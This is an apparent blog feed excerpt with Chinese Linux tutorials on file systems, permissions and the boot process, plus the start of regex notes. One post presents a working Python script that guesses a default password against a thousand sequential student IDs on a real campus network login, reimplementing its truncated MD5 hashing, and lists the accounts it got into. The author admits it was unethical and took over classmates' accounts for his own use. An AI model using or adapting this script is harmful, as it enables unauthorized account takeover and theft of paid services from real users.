    <link href="http://wuchong.me/blog/2014/07/19/linux-file-system/"/>
    <id>http://wuchong.me/blog/2014/07/19/linux-file-system/</id>
    <published>2014-07-18T23:36:37.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>我们知道不同的操作系统所使用的文件系统是不一样的。举例来说，Windows 98 以前所使用的是文件系统是 FAT，Windows 2000 以后的版本有所谓的 NTFS 文件系统。至于 Linux  的正规文件系统则为 Ext2（Linux second extended file system，Ext2fs）。之后又出现了改进版的 Ext3 和 Ext4 ，总体上变化不大。</p>
<h2 id="文件系统的对比">文件系统的对比</h2>
<p>我们经常听说 Windows 需要磁盘碎片整理，而 Linux 却不需要。这是为什么呢？</p>
<p>我们可以先看看 FAT 文件系统的数据访问方式，如下图所示。</p>
<p><img src="http://ww2.sinaimg.cn/mw690/81b78497jw1eic3rqwb6mj20qj0dzwfu.jpg" alt=""><br><a id="more"></a><br>假设一个文件的属性和权限信息是存放在 3 号的 inode 上，而文件的实际数据是存放在 1、4、6、11 这四个 block 中，那么当操作系统要访问该文件时，就能据此来排列磁盘的阅读顺序，可以扫描一次就将 4 个 block  内容读出来。这种访问方式称为索引式文件系统（indexed allocation）。而且 ext 在每两个文件之间都留有相当巨大的空闲空间。当文件被修改、体积增加时，它们通常有足够的空间来扩展。因此在一定程度上保证了 block 的访问范围不会跨度很大，减小了磁头的移动距离。</p>
<p>那 Windows 的文件系统是怎样的呢？ 我们以 FAT 为例说明。</p>
<p><img src="http://ww4.sinaimg.cn/mw690/81b78497jw1eic3rr7syaj20nv0azwf8.jpg" alt=""></p>
<p>在往 FAT 文件系统中存入一个文件时，系统会尽量存放在靠近磁盘开始的地方。当你存入第二个文件时，它会紧挨着第一个文件。当进行频繁的删除修改后，block 就会分散的特别厉害。FAT 文件系统没有 inode 的存在，所以不能一下子将文件的所有 block 在一开始就读取出来。每个 block 号码都记录在前一个 block 当中，形成一个 block 链。当我们需要读取文件的时候，就必须一个一个地将 block 读出，例如上图的读出顺序为 1、6、3、12 。这就会导致磁头无法在磁盘转一圈就获得所有数据，有时候需要来回转好几圈才能读取到这个文件，导致文件读取性能极差。这就是 Windows 经常需要碎片整理的原因——使离散的数据汇合在一起</p>
<p>而 NTFS 文件系统虽然智能了一点，在文件周围分配了一些“缓冲”的空间，但经过一段时间的使用后， NTFS 文件系统还是会形成碎片。由于 ext 是索引式文件系统，所以基本上不太需要经常进行磁盘碎片整理。</p>
<h2 id="ext2/ext3_文件系统">ext2/ext3 文件系统</h2>
<p>我们知道文件数据除了文件的实际内容外，通常还包括非常多的属性，例如 Linux 中的文件权限（rwx）和文件属性（拥有者、用户组、时间、大小等）。ext 文件系统将这两部分存放在不同的块，权限和属性存放在 inode 中，至于文件的实际数据则存放在 block 块中。另外还有一个超级块（super block）会记录整个文件系统的整体系统。每个 inode 和 block 都有自己的编号。</p>
<p>ext 文件系统在格式化的时候基本上是区分为多个块组（block group）的，每个块组都有独立的 inode/block/super block 系统。其整体展示图如下所示：</p>
<p><img src="http://ww2.sinaimg.cn/large/81b78497jw1eic3rpycyxj20l60b1myh.jpg" alt=""></p>
<p>其中各个块的含义如下：</p>
<ul>
<li><strong>super block</strong>：记录此文件系统的整体系统，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统类型等。</li>
<li>file system description：文件系统描述说明。描述每个 block group 的开始与结束的 block 号码。</li>
<li>block bitmap：块对照表。用来快速寻找可用的 block 块。</li>
<li>inode bitmap：inode对照表。用来快速寻找可用的 inode 块。</li>
<li><strong>inode table</strong>：存放 inode 块的地方。它们是文件系统的关键。记录了文件的属性，一个文件占用一个 inode，同时包含多个指针，指向了属于该文件的各个 data block 块</li>
<li><strong>data block</strong>：真正存放数据的地方。文件太大会占用多个 block 。</li>
</ul>
<h2 id="总结">总结</h2>
<p>本节主要讲述了 ext2/ext3 与其他文件系统的区别，以及不用磁盘碎片整理的原理。然后对 ext 文件系统的体系结构进行了剖析，说明了各个数据块的意义。重点是了解 inode 和 block 在 Linux 中所扮演的不同角色以及重要意义。</p>
<p>Linux 是一个文件王国，一切都以文件的形式存在。了解Linux的文件系统，是深入了解操作系Linux原理的重要一步。</p>
<h2 id="参考资料">参考资料</h2>
<ul>
<li><a href="http://book.douban.com/subject/4889838/" target="_blank" rel="external">鸟哥的Linux私房菜.基础学习篇</a></li>
</ul>
<p>-EOF-</p>
]]></content>
    <summary type="html"><![CDATA[<p>我们知道不同的操作系统所使用的文件系统是不一样的。举例来说，Windows 98 以前所使用的是文件系统是 FAT，Windows 2000 以后的版本有所谓的 NTFS 文件系统。至于 Linux  的正规文件系统则为 Ext2（Linux second extended file system，Ext2fs）。之后又出现了改进版的 Ext3 和 Ext4 ，总体上变化不大。</p>
<h2 id="文件系统的对比">文件系统的对比</h2>
<p>我们经常听说 Windows 需要磁盘碎片整理，而 Linux 却不需要。这是为什么呢？</p>
<p>我们可以先看看 FAT 文件系统的数据访问方式，如下图所示。</p>
<p><img src="http://ww2.sinaimg.cn/mw690/81b78497jw1eic3rqwb6mj20qj0dzwfu.jpg" alt=""><br>]]></summary>
    
      <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="文件系统" scheme="http://wuchong.me/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/LinuxUnix/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[用Python模拟登录“借”上网帐号]]></title>
    <link href="http://wuchong.me/blog/2014/07/16/use-python-login-borrow-account/"/>
    <id>http://wuchong.me/blog/2014/07/16/use-python-login-borrow-account/</id>
    <published>2014-07-16T08:22:57.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>昨天同学让我帮忙下篇论文，发现自己的校内上网帐号有一段时间没充值了。登录校园网才能下论文，无奈问了周围的人却发现都没充值！（实验室可以免费上网大家都不充值了么）</p>
<p>懒得去充值，就想会不会有的上网帐号还是用的默认密码？如果有的话，岂不是可以“借来”用一下！虽然有些不道德，但是为了验证心里的想法还是忍不住下手了。</p>
<h2 id="分析请求">分析请求</h2>
<p>首先当然是分析登录请求啦。我们学校的校园网登录网址为<code>10.0.0.55</code>。所以用 Chrome 打开登录网页，并打开<code>开发者工具 -&gt; Network</code>，再输入用户名密码，点击登录。可以捕获到 POST 消息。</p>
<p><img src="http://ww1.sinaimg.cn/mw690/81b78497jw1eiepcju7vuj20yw0gogoo.jpg" alt=""></p>
<p>其中最重要的是两个信息，一个是 Request URL，另一个是 Form Data。前者是提交请求的网址，后者是提交的表单。表单里最重要的是 username 和 password 两个字段。后面的三个字段可以忽略。我们发现，表单中的密码是加密后提交的。会用的什么加密呢？我们去 JS 脚本里找找有什么。</p>
<p><img src="http://ww2.sinaimg.cn/mw690/81b78497jw1eiepcjd6suj20yq0gswhi.jpg" alt=""></p>
<p>在源代码的 head 标签内发现了大段的 JS 脚本，其中就有关于登录的。其实就是用了简单的 MD5 加密，并将加密结果截取了第 8 到 24 的字符。连 salt 都没有用到。</p>
<p>有了上面这些信息后，我们就可以构造请求了。这当然要拿出 Python 大法了。<br><a id="more"></a></p>
<h2 id="模拟登录">模拟登录</h2>
<p>用 Python 可以快速实现模拟登录，主要使用了 <code>requests</code> 库。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="code"><pre><span class="comment">#encoding=utf8</span>
import requests

<span class="comment">###登录页的url</span>
url = <span class="string">'http://10.0.0.55/cgi-bin/do_login'</span>
<span class="comment">###有些网站反爬虫，这里用headers把程序伪装成浏览器</span>
header = { <span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows NT 6.1)
 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36'</span> }
<span class="comment">###登录需要提交的表单</span>
form_data = {<span class="string">'username'</span>:<span class="string">'2220130260'</span>, <span class="comment">#填入网站的上网帐号</span>
    <span class="string">'password'</span>:<span class="string">'8ad9902aecba32e2'</span>,  <span class="comment">#填入网站密码（加密后的）</span>
    <span class="string">'drop'</span>:<span class="number">0</span>,
    <span class="string">'type'</span>:<span class="number">1</span>,
    <span class="string">'n'</span>:<span class="number">100</span>
    }
s = requests.session()
response = s.post(url,data = form_data,headers = header)
<span class="keyword">print</span> response.text
</pre></td></tr></table></figure>

<p>最终读取 response 的结果，我们可以判断登录是否成功。例如，上述代码运行的结果是<code>password_error</code>。</p>
<h2 id="借帐号">借帐号</h2>
<p>有了上面的模拟登录，我们就可以把它写成脚本，遍历成百上千个帐号。其实就是用循环构造每一个表单。</p>
<p>这里密码我们使用 <code>hashlib</code> 库来完成 MD5 加密。至于上网帐号，一般都是用学生学号作为上网帐号的，就拿最小的 13 级本科生开刀吧（谁让你们年少无知呢，记得改密码）。像 13 级本科生的学校是 <code>112013</code> 开头，我们就循环前 1000 个学生。</p>
<p>直接给出脚本代码吧！</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre></td><td class="code"><pre><span class="comment">#encoding=utf8</span>
import requests
import hashlib

<span class="comment">###登录页的url</span>
url = <span class="string">'http://10.0.0.55/cgi-bin/do_login'</span>
<span class="comment">###有些网站反爬虫，这里用headers把程序伪装成浏览器</span>
header = { <span class="string">'User-Agent'</span> <span class="symbol">:</span> <span class="string">'Mozilla/5.0 (Windows NT 6.1)
 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36'</span> }

<span class="function"><span class="keyword">def</span> </span>md5(str)<span class="symbol">:</span>
    m = hashlib.md5()
    m.update(str)
    <span class="keyword">return</span> m.hexdigest()

<span class="function"><span class="keyword">def</span> </span>login(form_data)<span class="symbol">:</span>
    s = requests.session()
    <span class="comment">#发出请请求</span>
    response = s.post(url,data = form_data,headers = header)
    <span class="keyword">return</span> response.content

<span class="function"><span class="keyword">def</span> </span>tryAccount(id_start,id_end,default_pass)<span class="symbol">:</span>
    <span class="comment">###登录需要提交的表单</span>
    form_data = {<span class="string">'username'</span><span class="symbol">:<span class="string">'XXXXXX'</span></span>, <span class="comment">#填入网站的用户名</span>
        <span class="string">'password'</span><span class="symbol">:<span class="string">'XXXXXX'</span></span>,  <span class="comment">#填入网站密码（加密后的）</span>
        <span class="string">'drop'</span><span class="symbol">:</span><span class="number">0</span>,
        <span class="string">'type'</span><span class="symbol">:</span><span class="number">1</span>,
        <span class="string">'n'</span><span class="symbol">:</span><span class="number">100</span>
    }
    
    passwd = md5(default_pass)[<span class="number">8</span><span class="symbol">:</span><span class="number">24</span>]
    form_data[<span class="string">'password'</span>] = passwd      <span class="comment">#将加密后的密码填入表单</span>

    <span class="keyword">for</span> i <span class="keyword">in</span> range(id_start,id_end)<span class="symbol">:</span>
        form_data[<span class="string">'username'</span>] = str(i)  <span class="comment">#将用户名填入表单</span>
        result = login(form_data)       <span class="comment">#登录，获取返回的 response 结果</span>
        <span class="keyword">if</span> result != <span class="string">'password_error'</span> <span class="keyword">and</span> result != <span class="string">'username_error'</span><span class="symbol">:</span>
            print str(i)+<span class="string">"\t"</span>+result        <span class="comment">#打印账号、密码正确的学号...</span>
    print <span class="string">"\n上网不涉密，涉密不上网"</span>

<span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">"__main__"</span><span class="symbol">:</span>
    <span class="constant">ID_START</span> = <span class="number">1120130000</span>   <span class="comment">#起始学号</span>
    <span class="constant">ID_END</span> = <span class="number">1120131000</span>     <span class="comment">#结束学号</span>
    <span class="constant">DEFAULT_PASS</span> = <span class="string">"000000"</span> <span class="comment">#初始密码</span>
    tryAccount(<span class="constant">ID_START</span>,<span class="constant">ID_END</span>,<span class="constant">DEFAULT_PASS</span>)
</pre></td></tr></table></figure>

<p>运行脚本后得到如图。</p>
<p><img src="http://ww2.sinaimg.cn/mw690/81b78497jw1eiepciuuumj216g0vy77n.jpg" alt=""></p>
<p>显示的帐号都是用的默认密码的。返回的 response 结果中<code>status_error</code> 表示没充钱，<code>ip_exist_error</code>表示 IP 尚未下线。显示一串数字的就是可以直接登录的了！记得把帐号还给人家。</p>
<p>虽然最后还是没有下到论文，不过作为程序猿能把自己的想法用所学的实现了想想还是有些小激动的。</p>
<p>PS：发现研究生不改密码的比本科生还多，为什么呢？</p>
<p>-EOF-</p>
]]></content>
    <summary type="html"><![CDATA[<p>昨天同学让我帮忙下篇论文，发现自己的校内上网帐号有一段时间没充值了。登录校园网才能下论文，无奈问了周围的人却发现都没充值！（实验室可以免费上网大家都不充值了么）</p>
<p>懒得去充值，就想会不会有的上网帐号还是用的默认密码？如果有的话，岂不是可以“借来”用一下！虽然有些不道德，但是为了验证心里的想法还是忍不住下手了。</p>
<h2 id="分析请求">分析请求</h2>
<p>首先当然是分析登录请求啦。我们学校的校园网登录网址为<code>10.0.0.55</code>。所以用 Chrome 打开登录网页，并打开<code>开发者工具 -&gt; Network</code>，再输入用户名密码，点击登录。可以捕获到 POST 消息。</p>
<p><img src="http://ww1.sinaimg.cn/mw690/81b78497jw1eiepcju7vuj20yw0gogoo.jpg" alt=""></p>
<p>其中最重要的是两个信息，一个是 Request URL，另一个是 Form Data。前者是提交请求的网址，后者是提交的表单。表单里最重要的是 username 和 password 两个字段。后面的三个字段可以忽略。我们发现，表单中的密码是加密后提交的。会用的什么加密呢？我们去 JS 脚本里找找有什么。</p>
<p><img src="http://ww2.sinaimg.cn/mw690/81b78497jw1eiepcjd6suj20yq0gswhi.jpg" alt=""></p>
<p>在源代码的 head 标签内发现了大段的 JS 脚本，其中就有关于登录的。其实就是用了简单的 MD5 加密，并将加密结果截取了第 8 到 24 的字符。连 salt 都没有用到。</p>
<p>有了上面这些信息后，我们就可以构造请求了。这当然要拿出 Python 大法了。<br>]]></summary>
    
      <category term="Python" scheme="http://wuchong.me/tags/Python/"/>
    
      <category term="模拟登录" scheme="http://wuchong.me/tags/%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/"/>
    
      <category term="Python" scheme="http://wuchong.me/categories/Python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux基础：权限与文件]]></title>
    <link href="http://wuchong.me/blog/2014/07/15/linux-permission-and-file/"/>
    <id>http://wuchong.me/blog/2014/07/15/linux-permission-and-file/</id>
    <published>2014-07-15T05:15:25.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<h2 id="用户与用户组">用户与用户组</h2>
<p>Linux 是一个多用户、多任务的系统，常常有多人同时使用一台机工作，为了保护每个人的隐私权，“文件所有者”的角色就显得相当重要了。</p>
<p>当Linux用户登录系统之后，就会携带一个用户身份（User ID，UID）和一个用户组身份（Group ID，GID），相当于自己的名片。当需要访问文件或程序时，刷一下名片就能知道是否能读、写、执行了。</p>
<p>一般来说，Linux的用户信息保存在<code>/etc/passwd</code>中，组信息保存在<code>/etc/group</code>中，文件的每一行代表一个用户/组。早期的Linux将密码以明文的形式保存在<code>/etc/passwd</code>中，而现在则多以暗码(也就是加密之后的形式)的形式保存在<code>/etc/shadow</code>中。将密码存储在<code>/etc/shadow</code>中提高了密码的安全性，因为<code>/etc/passwd</code>允许所有人查看，而<code>/etc/shadow</code>只允许root用户查看。</p>
<p><a id="more"></a></p>
<h2 id="文件属性">文件属性</h2>
<p>要了解Linux的权限控制就必须学习Linux的文件权限和属性。可以用ls命令查询文件信息（<code>$ls -l</code>），得到如下结果：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
</pre></td><td class="code"><pre>$ ls -l  ~/input
总用量 36
drwxrwxr-x   2   wuchong wuchong  4096 7月 10 21:45 ./
drwxr-xr-x   30  wuchong wuchong  4096 7月 12 08:58 ../
-rw-rw-r--   1   wuchong wuchong  46   6月 16 20:31 a.txt
lrwxrwxrwx   1   wuchong wuchong  4    6月 16 16:03 b.txt -&gt; a.txt
[<span class="link_label">  权限  </span>][<span class="link_reference">连接数</span>][<span class="link_label">拥有者</span>][<span class="link_reference">用户组</span>][<span class="link_label">文件容量</span>][<span class="link_reference"> 修改日期 </span>] [文件名]
</pre></td></tr></table></figure>

<p>我们以 a.txt 文件为例介绍各个部分的含义：</p>
<ol>
<li>第一列代表文件权限。它由十个字符组成。首先介绍第一个字符的<code>-</code>，它表示文件类型，说明 a.txt 是常规文件(如果是目录文件则应显示 d，如果是 l 则是软链接文件)。随后有九个字符，为<code>rw-rw-r--</code>，它们用于表示文件权限。这九个字符分为三组，<code>rw-</code>,<code>rw-</code>, <code>r--</code>，分别对应拥有者(owner)，所属用户组(owner group)和所有其他人(other)。回顾  <a href="http://wuchong.me/blog/2014/07/14/linux-boot-process/" target="_blank" rel="external">Linux 的启动流程</a>，登录后，我们会有一个用户身份和一个组身份, 相当于我的身份证。第一组表示，如果我的身份证上的用户身份证明我是该文件的拥有者，那么我就可以对该文件有读取(r)，写入(w)该文件的权限，但不拥有执行(x)该文件的权限。如果不拥有某项权限，会在对应的位置上出现减号(-)。第二组表示，如果我的名片上的组身份证明我所在的组是该文件的所属用户组的一员，那么我有从该文件读入和写入的权限。第三组表示，如果我的名片显示我既不是拥有者，也不是拥有组的一员，那么我只有读入的权限。当我想要进行一个读取操作时，Linux会先看我是否是拥有者。</li>
<li>第二列代表有多少文件名连接到此节点（i-node）。每个文件都将它的权限和属性记录到文件系统的 inode 中，不过文件名却是存放在目录文件中的。因此会有多个文件名连接到一个 inode 的情况，这就是硬链接，而该列就是指的硬链接数。</li>
<li>第三列表示这个文件（或目录）的拥有者。</li>
<li>第四列表示这个文件（或目录）的所属用户组。</li>
<li>第五列表示这个文件的大小，单位为字节（byte）。其中软链接文件（上面的 b.txt 文件）的大小正好是目标文件的字符数。至于目录也是一种文件，有趣的是大部分目录所占的大小都是 1K、2K、4K 的倍数。</li>
<li>第六列表示文件的最近修改时间。其实文件属性中还包括创建时间和最近读取时间，只是并未显示出来。</li>
<li>第七列为该文件的文件名。</li>
</ol>
<h2 id="改变文件属性和权限">改变文件属性和权限</h2>
<p>我们已经知道文件权限对于一个系统的重要性了，但如何对文件的属性和权限进行修改呢？这里主要用到三个命令：<code>chgrp</code>、<code>chown</code>、<code>chmod</code>，分别对应修改用户组、拥有者和文件权限。</p>
<ul>
<li>改变所属用户组：chgrp<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre><span class="variable">$ </span>chgrp 组名  文件或目录
<span class="variable">$ </span>chgrp users a.txt
</pre></td></tr></table></figure></li>
<li>改变文件所有者：chown<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre><span class="variable">$ </span>chown 账号名称 文件或目录
<span class="variable">$ </span>chown 账号名称<span class="symbol">:</span>组名 文件或目录
<span class="variable">$ </span>chown <span class="symbol">root:</span>root a.txt
</pre></td></tr></table></figure></li>
<li>改变文件权限：chmod<br>Linux中的每种身份（own、group、other）拥有一个权限三元组（rwx）。每一个权限组可以用一个三位的二进制来表示，拥有对应权限的则在相应位上置1。例如<code>-rw-rw-r--</code>即代表 664 的意思。如果我们想将该文件改成<code>-rwxrwx---</code>的权限，就将其权限分数改成 770 即可。<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre>$ chmod <span class="number">770</span> <span class="operator">a</span>.txt
$ ls -l <span class="operator">a</span>.txt
-rwxrwx<span class="comment">---  1 root root 46  6月 16 20:31 a.txt</span>
</pre></td></tr></table></figure>

</li>
</ul>
<h2 id="默认权限umask">默认权限umask</h2>
<p>当我们创建文件的时候，比如使用<code>touch</code>，它会尝试将新建文件创建为权限666，也就是 rw-rw-rw-。但操作系统要参照权限 mask 来看是否真正将文件创建为666。权限 mask 表示操作系统不允许设置的权限位，比如说037(——wxrwx)的权限  mask 意味着不允许设置设置 group 的 wx 位和 other 的 rwx 位。如果是这个权限 mask 的话，最终的文件权限是 rw-r——- ( group 的 w 位和 other 的 rw 位被 mask )。</p>
<p>我们可以通过</p>
<p><figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="variable">$umask</span> <span class="number">022</span>
</pre></td></tr></table></figure><br>的方式改变权限mask。仅输入<code>umask</code>是查询默认 mask 的意思。</p>
<h2 id="总结">总结</h2>
<p>Linux 中的权限管理非常复杂，尤其是涉及进程的时候，有时会有权限的切换。这部分待到以后再说。不过Linux的权限管理都是基于文件的属性和权限的，因此学习了解 Linux 的文件系统非常重要。</p>
<h2 id="参考资料">参考资料</h2>
<ul>
<li><a href="http://book.douban.com/subject/4889838/" target="_blank" rel="external">鸟哥的Linux私房菜.基础学习篇</a></li>
</ul>
]]></content>
    <summary type="html"><![CDATA[<h2 id="用户与用户组">用户与用户组</h2>
<p>Linux 是一个多用户、多任务的系统，常常有多人同时使用一台机工作，为了保护每个人的隐私权，“文件所有者”的角色就显得相当重要了。</p>
<p>当Linux用户登录系统之后，就会携带一个用户身份（User ID，UID）和一个用户组身份（Group ID，GID），相当于自己的名片。当需要访问文件或程序时，刷一下名片就能知道是否能读、写、执行了。</p>
<p>一般来说，Linux的用户信息保存在<code>/etc/passwd</code>中，组信息保存在<code>/etc/group</code>中，文件的每一行代表一个用户/组。早期的Linux将密码以明文的形式保存在<code>/etc/passwd</code>中，而现在则多以暗码(也就是加密之后的形式)的形式保存在<code>/etc/shadow</code>中。将密码存储在<code>/etc/shadow</code>中提高了密码的安全性，因为<code>/etc/passwd</code>允许所有人查看，而<code>/etc/shadow</code>只允许root用户查看。</p>
<p>]]></summary>
    
      <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="权限" scheme="http://wuchong.me/tags/%E6%9D%83%E9%99%90/"/>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/LinuxUnix/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux基础：启动流程]]></title>
    <link href="http://wuchong.me/blog/2014/07/14/linux-boot-process/"/>
    <id>http://wuchong.me/blog/2014/07/14/linux-boot-process/</id>
    <published>2014-07-14T02:15:05.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>计算机的启动是一个非常复杂的过程，从打开电源到桌面的显示，需要经过一系列不可或缺的过程，了解这些过程有助于我们更好地理解操作系统，也有助于我们修复系统可能出现的问题。</p>
<h2 id="0-_启动流程一览">0. 启动流程一览</h2>
<p>我们先给出 Linux 启动流程的总览图，然后再每一个模块展开说明。</p>
<p><img src="http://ww4.sinaimg.cn/large/81b78497jw1eic3rqn72tj20hf06774l.jpg" alt=""></p>
<p><a id="more"></a></p>
<h2 id="1-_BIOS">1. BIOS</h2>
<p>当我们按下电源按键后，计算机硬件会自动读取主板上的BIOS（Basic Input/Output System）来加载硬件信息以及硬件系统的自我测试。BIOS也是一套程序，它知道如何与硬件进行交互。BIOS首先会对硬件进行检查，判断计算机硬件是否能满足运行的基本条件，这叫做“硬件自检”（Power-On Self-Test，简称 POST）。</p>
<p>硬件自检后，BIOS 会将控制权交给下一段启动程序。这时，BIOS需要知道，”下一阶段的启动程序”具体存放在哪一个设备。也就是说，BIOS需要有一个外部存储设备的排序，排在前面的设备就是优先转交控制权的设备。这种排序叫做”启动顺序”（Boot Sequence）。</p>
<p>因此，BIOS按照”启动顺序”，把控制权转交给排在第一位的存储设备。</p>
<h2 id="2-_MBR">2. MBR</h2>
<p>系统读取位列第一的可启动存储设备。计算机先读取该设备的第一个扇区，也就是读取最前面的512个字节。这最前面的512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR）。MBR 只有512字节，放不了太多东西，它主要告诉计算机从该设备的哪一个分区（partition）来装载引导加载程序（boot loader）。Boot Loader 储存有操作系统（OS）的相关信息，比如操作系统名称，操作系统内核（kernel）所在位置等。它的主要功能就是加载内核到内存中去执行。常用的 boot loader 有 GRUB 和 LILO 。</p>
<p>那我们经常说到的多操作系统是怎么回事呢？其实每个文件系统（或分区）的最前面会保留一个引导扇区（boot selector），这个引导扇区可以安装 boot loader。这样我们在每个 boot loader 中对应不同的操作系统，在读取 MBR 的时候选择我们需要启动的 boot loader 即可。</p>
<h2 id="3-_kernel">3. kernel</h2>
<p>随后，boot loader 会帮助我们加载内核，内核就会开始检测硬件与加载驱动程序。没错，内核会以自己的功能重新检测一遍硬件，而不一定会使用 BIOS 检测到的硬件信息。也就是说，内核此时才开始接管 BIOS 后的工作。</p>
<p>Kernel 实际上是一个用来操作计算机的程序，它是计算机操作系统的内核，主要的任务是管理计算机的硬件资源，充当软件和硬件的接口。操作系统上的任何操作都要通过 kernel 传达给硬件。</p>
<h2 id="4-_init_process">4. init process</h2>
<p>在内核加载完毕以后，此时内核会主动调用第一个进程，那就是 <code>/sbin/init</code>，它的作用就是初始化系统环境。使用<code>pstree</code>命令会发现init的进程编号（PID）是1，也就是说init是第一个运行的程序，其他所有进程都从它衍生，都是它的子进程。</p>
<p>许多程序需要开机启动。它们在Windows叫做”服务”（service），在 Linux 就叫做”守护进程”（daemon）。</p>
<p>init 进程的一大任务，就是去运行这些开机启动的程序。但是，不同的场合需要启动不同的程序，比如用作服务器时，需要启动 Apache，用作桌面就不需要。Linux 允许为不同的场合，分配不同的开机启动程序，这就叫做”运行级别”（run level）。也就是说，启动时根据”运行级别”，确定要运行哪些程序。</p>
<p>基本上，依据有无网络与有无 X Window ，Linux 将 run level 划分为7个等级（0-6）。其中0是关机，1是单用户模式，6是重启。而 2-5，一般来说都是多用户模式。</p>
<p>Linux 在启动各个服务前会先执行一系列的初始脚本（rc.sysinit）。这些脚本执行如下功能：设置计算机名称，时区，检测文件系统，挂载硬盘，清空临时文件，设置网络……<br>之后会根据运行级别的不同，系统会运行 rc0.d 到 rc6.d 目录中的相应的脚本程序，来完成相应的初始化工作和启动相应的服务。rc*.d目录中存放的是该运行级别中需要执行的服务脚本的软链接文件（即快捷方式）。</p>
<p>除此之外，Linux 还会运行一些其他的初始脚本。运行完后，操作系统已经完全准备好了，只是，还没有人可以登录！！！init 会给出登录（login）对话框，或者是图形化的登录界面。</p>
<h2 id="5-_login">5. login</h2>
<p>输入用户名密码登录成功后，系统会为用户分配一个用户 ID（UID），和一个组 ID（GID）。这两个 ID 就好像身份证一样会一直伴随用户，用于检测用户执行程序时的身份验证。</p>
<p>当用户登录成功后，一个完整的操作系统就展现在用户的面前了。哈哈！</p>
<h2 id="总结">总结</h2>
<p>结合一开始给出的流程图，Linux 的启动流程可以概括为以下几个主要步骤：</p>
<ol>
<li>加载 BIOS 的硬件信息与硬件自检，并依据设置取得第一个可启动的设备；</li>
<li>读取并执行第一个启动设备内的MBR的 boot loader；</li>
<li>依据 boot loader 的设置加载内核，内核会开始检测硬件与加载驱动程序；</li>
<li>在内核 Kernel 加载完毕后，Kernel  会主动调用 init 进程，而 init 会取得 run-level 信息；</li>
<li>init 执行 rc.sysinit 初始化系统的操作环境（网络、时区等）；</li>
<li>init 启动 run-level 的各个服务；</li>
<li>用户登录</li>
</ol>
<p>要注意在一开始的流程图中 init 虽然只用了一个模块展现出来，但其实在启动过程中 init 占了很大的比重。</p>
<h2 id="参考文献">参考文献</h2>
<ul>
<li><a href="http://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html" target="_blank" rel="external">Linux 的启动流程</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2013/02/booting.html" target="_blank" rel="external">计算机是如何启动的？</a></li>
<li><a href="http://www.cnblogs.com/vamei/archive/2012/09/05/2672039.html" target="_blank" rel="external">Linux开机启动 (bootstrap) </a></li>
<li><a href="http://vbird.dic.ksu.edu.tw/linux_basic/linux_basic.php" target="_blank" rel="external">鸟哥的Linux私房菜.基础学习篇</a></li>
</ul>
]]></content>
    <summary type="html"><![CDATA[<p>计算机的启动是一个非常复杂的过程，从打开电源到桌面的显示，需要经过一系列不可或缺的过程，了解这些过程有助于我们更好地理解操作系统，也有助于我们修复系统可能出现的问题。</p>
<h2 id="0-_启动流程一览">0. 启动流程一览</h2>
<p>我们先给出 Linux 启动流程的总览图，然后再每一个模块展开说明。</p>
<p><img src="http://ww4.sinaimg.cn/large/81b78497jw1eic3rqn72tj20hf06774l.jpg" alt=""></p>
<p>]]></summary>
    
      <category term="Linux基础" scheme="http://wuchong.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="启动流程" scheme="http://wuchong.me/tags/%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/"/>
    
      <category term="Linux/Unix" scheme="http://wuchong.me/categories/LinuxUnix/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[正则表达式学习]]></title>
    <link href="http://wuchong.me/blog/2014/07/02/learn-regular-expressions/"/>
    <id>http://wuchong.me/blog/2014/07/02/learn-regular-expressions/</id>
    <published>2014-07-02T09:43:45.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>最近在看鸟哥 Linux，看到正则表达式这块，以前看到这些恐怖的字符总是觉得恶心，今天就咬牙系统的学习了下正则表达式。然后有了这篇笔记。主要总结正则表达式的一些关键知识点。</p>
<ul>
<li>字面值：<code>a b c d 1 2 3 4</code> 等等。</li>
<li>字符类：<code>. [abc] [a-z] \d \w \s</code><ul>
<li><code>.</code> 表示“任何字符”</li>
<li><code>[abc]</code>  括号表示“找到集合里任意一个字符”。</li>
<li><code>\d</code> 表示“一个数字”，等同于<code>[0-9]</code></li>
